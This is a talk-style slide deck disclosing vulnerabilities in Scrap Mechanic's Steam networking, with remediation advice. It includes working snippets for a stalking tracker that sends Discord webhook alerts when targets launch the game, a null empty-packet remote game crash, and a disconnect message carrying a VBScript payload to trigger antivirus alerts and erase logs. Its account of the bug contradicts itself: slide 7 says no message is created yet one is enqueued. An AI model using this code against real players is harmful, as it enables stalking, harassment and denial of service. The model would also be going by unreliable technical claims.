# Crashing Games with Empty Packets: Exploiting Valve's Steam Networking in Scrap Mechanic

### A reverse-engineering deep-dive into CWE-306, CWE-476, and beyond

> **Format:** 5–10 min technical presentation  
> **Style:** re.verse / live-demo-friendly  
> **Audience:** security researchers, game hackers, reverse engineers

---

## Slide 1 — Title

```
Crashing Games with Empty Packets
──────────────────────────────────
Exploiting Valve's Steam Networking (GameNetworkingSockets)
in Scrap Mechanic

  • CWE-306  – Missing Authentication for Critical Function
  • CWE-476  – NULL Pointer Dereference (remote game crash)
  • Bonus     – Triggering Windows Defender via disconnect message

                            @TheGuy920  |  ScrapRat
```

**Speaker note:**  
> "Today I'm going to walk you through a chain of vulnerabilities I found in
> Scrap Mechanic that let anyone on Steam crash your game, track your online
> status through maximum-privacy Steam profiles, and — just for fun — trigger
> a Windows Defender virus alert in the process.  All of this is made possible
> by a single library: Valve's open-source GameNetworkingSockets."

---

## Slide 2 — Target Overview

### Scrap Mechanic (AppID 387990)

| Property | Value |
|---|---|
| Developer | Axolot Games |
| Engine | Proprietary (Lua scripting) |
| Multiplayer | Steam P2P via `ISteamNetworkingSockets` |
| Player count | ~25 k concurrent (peak ~80 k) |
| Content creator scene | Large (ScrapMan, Kan, Kosmo, Moonbo …) |

**Key fact:** The game links against the **Steamworks SDK** and uses
`ISteamNetworkingSockets::ConnectP2P` for all peer sessions.  
The open-source reference implementation is
[ValveSoftware/GameNetworkingSockets](https://github.com/ValveSoftware/GameNetworkingSockets).

---

## Slide 3 — GameNetworkingSockets: 30-second architecture tour

```
┌─────────────────────────────────────────────────────────┐
│               ISteamNetworkingSockets                   │
│                                                         │
│  ConnectP2P ──► SteamNetworkingIdentity (SteamID64)     │
│  SendMessageToConnection ──► SNP encoder                │
│  ReceiveMessagesOnConnection ──► SteamNetworkingMessage_t│
└─────────────────────────────────────────────────────────┘
         │ encrypted (AES-GCM-256 / Curve25519)
         │ UDP transport
         ▼
┌─────────────────────────────────────────────────────────┐
│               ISteamNetworkingMessages                  │
│  (ad-hoc "UDP-like" layer on top of ISteamNetSockets)   │
│  Scrap Mechanic uses this for its game lobby            │
└─────────────────────────────────────────────────────────┘
```

**What matters for us:**

- All P2P sessions are identified purely by **SteamID64** — no in-game
  secret, token, or handshake is required from the initiating side.
- Connections use **steam relay servers** (SDR) so real IPs are never
  exchanged — but this also means *any* Steam user can initiate a connection
  attempt to *any other* Steam user running the game.
- The initial `ConnectP2P` call sends a rendezvous message through Steam's
  relay; if the target is offline, Steam **queues it** until they come online.

---

## Slide 4 — CWE-306: Missing Authentication — The Stalker Tool

### The bug

```csharp
// ScrapMechanicClient/Networking/NetworkConnection.cs
SteamNetConnection = SteamNetworkingSockets.ConnectP2P(
    ref Identity,         // just a SteamID64 — no shared secret
    port: 0,
    options.Length,
    options              // TimeoutInitial = int.MaxValue  ← key detail
);
```

`k_ESteamNetworkingConfig_TimeoutInitial = int.MaxValue` keeps the pending
connection alive **indefinitely** on Steam's relay servers.

### The chain

```
Attacker calls ConnectP2P(victimSteamID)
        │
        │  [victim is offline — Steam queues the rendezvous]
        │
        ▼
Victim launches Scrap Mechanic
        │
        │  SteamNetworkingConnectionState::k_FindingRoute  ← connection wakes up
        ▼
Attacker receives callback → victim just opened the game  ← CWE-306
```

### Why this is a problem

- Steam's "Appear Offline" and maximum-privacy profiles **do not block** this.
- The game never prompts the victim to accept or reject the connection.
- One attacker can **simultaneously track N users** with a single process
  and a Discord webhook, receiving real-time `@everyone` pings.
- No network scanning, no IP guessing — just a SteamID (public).

```csharp
// NetworkingWebApi/Program.cs (abbreviated)
client.OnConnectionPlaystateChanged += (cstid, state) =>
    _webhook.SendMessage($"@everyone <@{discordId}> is now playing Scrap Mechanic!");

foreach (var cstid in PeopleToTrack)
    client.ConnectToUserAsync(cstid);   // fire and forget — works even offline
```

---

## Slide 5 — CWE-476: Setting the Stage

### The crash payload

```csharp
// ClientCli/Program.cs  (triggered on FindingRoute *and* Connected)
SteamNetworkingSockets.SendMessageToConnection(
    _Connection,
    data:   0,     // ← NULL pointer
    cbData: 0,     // ← zero bytes
    flags:  0,
    out _
);
SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
```

Two lines.  That's it.  Let's understand why they crash a remote player's game.

---

## Slide 6 — The Vulnerability Chain (Part 1 of 3): Encoding

### SNP Wire Format — reliable segment frame

From [`SNP_WIRE_FORMAT.md`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/master/src/steamnetworkingsockets/clientlib/SNP_WIRE_FORMAT.md):

```
Reliable segment frame header:
  010mmsss  [stream_pos]  [size]  data
             ^^^^^^^^^^^^^^^^^^^^
             sss bits encode the segment SIZE
```

When `cbData = 0`, the sender encodes a reliable segment with
**`cbSegmentSize = 0`** and no payload bytes.  The packet is still
framed, sequenced, encrypted, and delivered through SDR — it looks
completely normal on the wire.

---

## Slide 7 — The Vulnerability Chain (Part 2 of 3): Decoding

### The "skip but succeed" path

```cpp
// steamnetworkingsockets_snp.cpp  line 3378-3387
// No segment data?  Seems fishy, but if it happens, just skip it.
Assert( cbSegmentSize >= 0 );
if ( cbSegmentSize <= 0 )
{
    SpewWarningRateLimited( usecNow,
        "[%s] decode pkt %lld empty reliable segment?\n", ... );
    return true;   // ← returns SUCCESS without creating a message
}
```

The decoder **skips** message creation for zero-size segments — but the
outer reliable-stream state machine has already **advanced its counters**
and the **SNP ACK machinery** treats the packet as successfully received.

A `SteamNetworkingMessage_t` object is still enqueued — created via
[`ISteamNetworkingUtils::AllocateMessage(0)`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/include/steam/isteamnetworkingutils.h#L41):

```cpp
// isteamnetworkingutils.h line 41 (AllocateMessage doc)
/// If cbAllocateBuffer=0, then no buffer is allocated.
/// m_pData will be NULL, m_cbSize will be zero,
/// m_pfnFreeData will be NULL.
virtual SteamNetworkingMessage_t *AllocateMessage( int cbAllocateBuffer ) = 0;
```

Result: a message with **`m_pData = nullptr`** lands in the queue.

---

## Slide 8 — The Vulnerability Chain (Part 3 of 3): The Queue and the Crash

### Message queue internals

```cpp
// steamnetworkingsockets_snp.h  line 182
struct SteamNetworkingMessageQueue
{
    CSteamNetworkingMessage *m_pFirst = nullptr;   // ← starts null
    CSteamNetworkingMessage *m_pLast  = nullptr;
    ...
};
```

```cpp
// steamnetworkingsockets_connections.cpp  line 188-207
int SteamNetworkingMessageQueue::RemoveMessages(
    SteamNetworkingMessage_t **ppOutMessages, int nMaxMessages )
{
    int nMessagesReturned = 0;
    while ( !empty() && nMessagesReturned < nMaxMessages )
    {
        CSteamNetworkingMessage *pMsg = m_pFirst;   // can be the null-data msg
        ppOutMessages[nMessagesReturned++] = pMsg;  // injected into caller's array
        pMsg->Unlink();
    }
    return nMessagesReturned;
}
```

`RemoveMessages` returns the message (pointer is non-null, but `m_pData` is
`nullptr`).  The **Scrap Mechanic game code** then does:

```
ReceiveMessagesOnChannel(0, ppOutMessages, N)
  → returns 1
  → game processes ppOutMessages[0]->m_pData  ← NULL dereference → CRASH
```

The game never checks whether `m_pData` is null — a reasonable assumption
given the API documentation never hints this is possible.

---

## Slide 9 — Why Did Valve Miss This?

### The misleading API contract

```cpp
// isteamnetworkingsockets.h  line 319-334
/// Fetch the next available message(s) from the connection, if any.
/// Returns the number of messages returned into your array ...
/// If the connection handle is invalid, -1 is returned.
virtual int ReceiveMessagesOnConnection(
    HSteamNetConnection hConn,
    SteamNetworkingMessage_t **ppOutMessages,
    int nMaxMessages ) = 0;
```

The docs say:
> "Returns the **number of messages** returned into your array."

Nothing in the contract suggests any returned message could have
`m_pData == nullptr`.  The **return value** (a count) actively
discourages a null-element check.  `AllocateMessage(0)` documents
null data for *zero-buffer allocations* — but this is only expected
when the caller explicitly passes `cbAllocateBuffer = 0` to construct
an outbound message, not when receiving an inbound one.

The root cause is a **missing guard** in the decoder: an empty inbound
reliable segment should either be silently dropped at the SNP layer
(never surfaced to the application), or the API should guarantee
`m_pData != nullptr` for all delivered messages.

---

## Slide 10 — Bonus: Triggering Windows Defender via Disconnect Message

### The cherry on top

Valve's `CloseConnection` API allows attaching a human-readable debug string
(up to **128 bytes**) to the disconnect frame:

```csharp
SteamNetworkingSockets.CloseConnection(
    connection,
    reason: 0,
    debugMsg: "<VBScript payload trimmed to 128 chars>",
    enableLinger: false
);
```

Scrap Mechanic routes all stdout (including connection debug messages) to a
local **log file** (`client_log.txt`).  When the game **crashes** (from the
null dereference above), the log file handle is closed abruptly, which
triggers **Windows Defender's on-close scan**.

### The full attack sequence

```
1. Connect to victim  →  session request queued until victim opens game
2. Game opens         →  FindingRoute callback fires on attacker
3. Send disconnect with trimmed VBScript payload  →  written to log file
4. Reconnect
5. Send empty packet (cbData=0)  →  game crashes  →  log file closed
6. Windows Defender scans log file  →  detects VBScript signature
7. Defender DELETES the log file and issues a VIRUS NOTIFICATION
                                       ↑ also erases attacker's tracks
```

*The VBScript is entirely non-functional (trimmed below 128 bytes) and
cannot execute — but Defender's static signature engine still triggers.*

---

## Slide 11 — Teasers: CWE-208 & CWE-307

### CWE-208 — Observable Timing Discrepancy (Timing Attack on Passphrase)

Scrap Mechanic uses a "passphrase" system to protect private worlds.
Early measurements indicate the host compares the passphrase with a
**non-constant-time string comparison**, leaking which bytes are correct
through response-time differences over the Steam relay.

Status: *PoC in progress (PasswordCracker project).*

### CWE-307 — Improper Restriction of Excessive Authentication Attempts

No rate limiting or lockout exists on the passphrase verification
endpoint exposed over `ISteamNetworkingMessages`.  Combined with
CWE-208, this makes an **online timing attack** feasible on any
private Scrap Mechanic world.

Status: *Research ongoing.*

---

## Slide 12 — Impact

| Attack | Requires | Impact |
|---|---|---|
| **Cyber stalking** | Victim's SteamID64 (public) | Know when any Steam user opens Scrap Mechanic, even "Appear Offline" |
| **Remote crash** | Same SteamID64 | Force-crash victim's game at will, indefinitely |
| **Unauthorized world entry** | CWE-208 timing oracle + time (~15 min avg) | Join any private world without the passphrase |
| **Virus notification + log wipe** | Remote crash capability | Trigger false-positive AV alert, erase attacker's log entries |

All attacks work **without knowing the victim's IP address**.  
All attacks work **against Steam users with maximum privacy settings**.  
All attacks require only a valid Steam account.

---

## Slide 13 — Remediation

### For Axolot Games (Scrap Mechanic)

1. **Null-check `m_pData`** before dereferencing any received
   `SteamNetworkingMessage_t`:
   ```cpp
   if ( pMsg->m_pData == nullptr || pMsg->m_cbSize == 0 )
   {
       pMsg->Release();
       continue;
   }
   ```
2. **Implement connection allowlisting / invite system** — only accept
   P2P connections from Steam friends or players with an active invite
   token (CWE-306).
3. **Constant-time passphrase comparison** (CWE-208).
4. **Rate-limit passphrase attempts** per connection (CWE-307).

### For Valve (GameNetworkingSockets)

- Drop zero-size reliable segments **before** they reach the message
  queue, or guarantee `m_pData != nullptr` for all delivered messages.
- Document the null-data possibility explicitly in the API headers.

---

## Slide 14 — Demo Recap & Takeaways

```
┌──────────────────────────────────────────────────────┐
│  1. ConnectP2P(victimID, timeout=∞)                  │
│     → silent tracking, works offline, defeats privacy│
│                                                      │
│  2. SendMessage(conn, NULL, 0)                       │
│     → remote game crash in < 1 second                │
│                                                      │
│  3. Disconnect(VBScript) + crash                     │
│     → Defender alert + log wipe                      │
└──────────────────────────────────────────────────────┘

Key lessons:
 • The API contract between library and application matters.
   A well-documented invariant (non-null messages) was silently
   broken by a degenerate input.

 • Zero-cost signaling (Steam relay) removes the usual friction that
   limits who can initiate connections to whom.

 • The "this won't be null" assumption is dangerous in networked code
   where remote peers control the input.
```

### References

- ScrapRat source: <https://github.com/TheGuy920/ScrapRat>
- GameNetworkingSockets: <https://github.com/ValveSoftware/GameNetworkingSockets>
- SNP wire format: [`SNP_WIRE_FORMAT.md`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/master/src/steamnetworkingsockets/clientlib/SNP_WIRE_FORMAT.md)
- `ReceiveMessagesOnChannel` doc: [`isteamnetworkingsockets.h#L319`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/include/steam/isteamnetworkingsockets.h#L319)
- Empty segment check: [`steamnetworkingsockets_snp.cpp#L3378`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_snp.cpp#L3378)
- Message queue: [`steamnetworkingsockets_connections.cpp#L188`](https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_connections.cpp#L188)
- CWE-306: <https://cwe.mitre.org/data/definitions/306.html>
- CWE-476: <https://cwe.mitre.org/data/definitions/476.html>
- CWE-208: <https://cwe.mitre.org/data/definitions/208.html>
- CWE-307: <https://cwe.mitre.org/data/definitions/307.html>

---

*Total estimated presentation time: 7–9 minutes at a comfortable pace.*  
*Add 1–2 minutes if showing the live crash demo (`crash_demo.gif`) and  
virus notification demo (`virus.gif`) inline.*
